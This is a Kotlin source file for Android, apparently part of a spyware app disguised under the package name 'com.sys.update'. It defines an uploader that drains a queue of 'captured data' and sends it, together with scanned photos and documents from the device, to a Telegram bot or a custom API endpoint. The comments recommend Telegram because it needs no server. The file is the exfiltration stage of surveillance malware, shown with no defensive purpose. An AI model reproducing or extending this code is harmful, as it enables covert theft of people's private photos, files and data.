package com.sys.update

import android.content.Context
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

/**
 * Sends captured data to backend.
 * Backend options (Config.kt):
 *   - Telegram Bot (recommended — no server needed)
 *   - Custom API endpoint
 * If neither is configured, data stays in local queue (DataStore).
 */
object Uploader {

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    // ─────────────  MAIN ENTRY  ─────────────

    fun flushQueue(ctx: Context) {
        if (!Config.hasAnyBackend()) return

        try {
            val lines = DataStore.drain(ctx, limit = 200)
            if (lines.isEmpty()) return

            if (Config.hasTelegram()) {
                val batch = lines.joinToString("\n").take(3500)
                sendTelegramText(batch)
            } else if (Config.hasApi()) {
                val body = lines.joinToString("\n")
                sendToApi("/queue", body)
            }
        } catch (e: Exception) {
            Log.e("Uploader", "flush err: ${e.message}")
        }
    }

    // ─────────────  MEDIA UPLOAD  ─────────────

    fun uploadMediaFile(ctx: Context, mf: MediaScanner.MediaFile) {
        if (!Config.hasAnyBackend()) return
        val file = File(mf.path)
        if (!file.exists()) return

        try {
            if (Config.hasTelegram()) {
                if (mf.mime.startsWith("image/")) sendTelegramPhoto(file)
                else sendTelegramDocument(file)
            } else if (Config.hasApi()) {
                sendFileToApi(file)
            }
        } catch (e: Exception) {
            Log.e("Uploader", "media err: ${e.message}")
        }
    }

    // ─────────────  TELEGRAM  ─────────────

    private fun sendTelegramText(text: String) {
        val url = "https://api.telegram.org/bot${Config.TELEGRAM_BOT_TOKEN}/sendMessage"
        val json = JSONObject().apply {
            put("chat_id", Config.TELEGRAM_CHAT_ID)
            put("text", text)
            put("disable_web_page_preview", true)
        }.toString()

        val req = Request.Builder()
            .url(url)
            .post(json.toRequestBody("application/json".toMediaType()))
            .build()

        client.newCall(req).execute().use { it.close() }
    }

    private fun sendTelegramPhoto(file: File) {
        val url = "https://api.telegram.org/bot${Config.TELEGRAM_BOT_TOKEN}/sendPhoto"
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", Config.TELEGRAM_CHAT_ID)
            .addFormDataPart("caption", file.name)
            .addFormDataPart(
                "photo", file.name,
                file.asRequestBody("image/*".toMediaType())
            )
            .build()

        val req = Request.Builder().url(url).post(body).build()
        client.newCall(req).execute().use { it.close() }
    }

    private fun sendTelegramDocument(file: File) {
        val url = "https://api.telegram.org/bot${Config.TELEGRAM_BOT_TOKEN}/sendDocument"
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", Config.TELEGRAM_CHAT_ID)
            .addFormDataPart("caption", file.name)
            .addFormDataPart(
                "document", file.name,
                file.asRequestBody("application/octet-stream".toMediaType())
            )
            .build()

        val req = Request.Builder().url(url).post(body).build()
        client.newCall(req).execute().use { it.close() }
    }

    // ─────────────  CUSTOM API  ─────────────

    private fun sendToApi(path: String, body: String) {
        val url = Config.API_ENDPOINT.trimEnd('/') + path
        val req = Request.Builder()
            .url(url)
            .post(body.toRequestBody("application/json".toMediaType()))
            .build()
        client.newCall(req).execute().use { it.close() }
    }

    private fun sendFileToApi(file: File) {
        val url = Config.API_ENDPOINT.trimEnd('/') + "/upload"
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart(
                "file", file.name,
                file.asRequestBody("application/octet-stream".toMediaType())
            )
            .build()
        val req = Request.Builder().url(url).post(body).build()
        client.newCall(req).execute().use { it.close() }
    }
}
